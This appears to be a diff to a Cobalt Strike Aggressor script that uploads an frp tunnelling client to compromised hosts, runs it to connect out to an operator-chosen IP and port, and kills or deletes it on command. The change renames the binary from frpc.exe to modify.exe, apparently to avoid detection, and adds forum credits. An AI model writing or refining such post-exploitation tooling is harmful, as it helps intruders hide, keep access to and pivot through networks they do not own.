@@ -2,7 +2,9 @@
 #                            #
 #                            #
 #                            #
-#       Xway.cn@panda        #
+#       xway.cn@panda8       #
+#       secquan.org@panda8   #
+#		t00ls.com@panda8     #
 #                            #
 #                            #
 #                            #
@@ -33,9 +35,9 @@ sub FRP {
 
     bcd($bid, $3['UploadPath']);
     if (-is64 $bid['id']) {
-        bupload($bid, script_resource("/script/x64/frpc.exe"));
+        bupload($bid, script_resource("/script/x64/modify.exe"));
     }else{
-        bupload($bid, script_resource("/script/x86/frpc.exe"));
+        bupload($bid, script_resource("/script/x86/modify.exe"));
     }
 
 }
@@ -53,20 +55,20 @@ sub frpc_run{
     local('$Name $port');
     $Name = $3['ip'];
     $port = replace($3['port'], "\"", "");
-	bshell($bid, "frpc.exe -t  $+ $Name -p  $+ $port");
+	bshell($bid, "modify.exe -t  $+ $Name -p  $+ $port");
 }
 
 			item "关闭frpc"{
 			local('$bid');
 			foreach $bid ($1){
-				bshell($1, "taskkill -f /im frpc.exe");
+				bshell($1, "taskkill -f /im modify.exe");
 			}
 		}
 
         	item "删除frpc"{
         	local('$bid');
         	foreach $bid ($1){
-            	bshell($1, "del /f /s /q frpc.exe");
+            	bshell($1, "del /f /s /q modify.exe");
         	}
 		}
     }
